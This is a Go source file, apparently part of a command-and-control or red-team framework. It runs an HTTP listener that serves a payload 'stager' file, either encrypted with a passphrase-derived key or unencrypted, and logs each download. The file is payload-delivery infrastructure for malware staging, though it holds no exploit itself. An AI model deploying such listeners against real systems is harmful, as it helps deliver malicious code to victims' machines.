package listener

import (
	"context"
	"fmt"
	"net/http"
	"os"
	"sync"
)

var (
	server       *http.Server
	httpServerMu sync.RWMutex
)

// serveStager serves the encrypted stager file over HTTP.
func serveStager(stager_enc []byte, port string) error {
	httpServerMu.Lock()
	if server != nil {
		listenerLogf("Shutting down existing server on port %s", server.Addr)
		if err := server.Shutdown(context.TODO()); err != nil {
			listenerLogf("Error shutting down server: %v", err)
		}
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		listenerLogf("Received request from %s", r.RemoteAddr)
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("Content-Length", fmt.Sprintf("%d", len(stager_enc)))
		w.Write(stager_enc)
		listenerLogf("Served encrypted stager to %s", r.RemoteAddr)
	})

	server = &http.Server{
		Addr:    fmt.Sprintf(":%s", port),
		Handler: mux,
	}
	httpServerMu.Unlock()

	listenerLogf("Starting HTTP server on port %s", port)
	return server.ListenAndServe()
}

// HTTPListener reads the payload file, encrypts it with the key-derived stream,
// and serves it over HTTP.
// stagerPath: path to the payload file to serve.
// port: TCP port to listen on.
// keyStr: passphrase used for key derivation.
func HTTPListener(stagerPath, port, keyStr string) error {
	blob, err := buildServedBlob(stagerPath, keyStr)
	if err != nil {
		return err
	}

	listenerLogf("Serving payload on port %s via HTTP", port)
	return serveStager(blob, port)
}

// HTTPBareListener serves the stager file over HTTP without any encryption or compression.
func HTTPBareListener(stagerPath, port string) error {
	stager, err := os.ReadFile(stagerPath)
	if err != nil {
		return fmt.Errorf("failed to read stager file: %v", err)
	}

	listenerLogf("Serving stager file on port %s", port)
	return serveStager(stager, port)
}

// StopHTTP stops the HTTP server.
func StopHTTP() {
	httpServerMu.Lock()
	defer httpServerMu.Unlock()
	if server != nil {
		listenerLogf("Shutting down HTTP server on %s", server.Addr)
		if err := server.Shutdown(context.TODO()); err != nil {
			listenerLogf("Error shutting down HTTP server: %v", err)
		}
		server = nil
	}
}
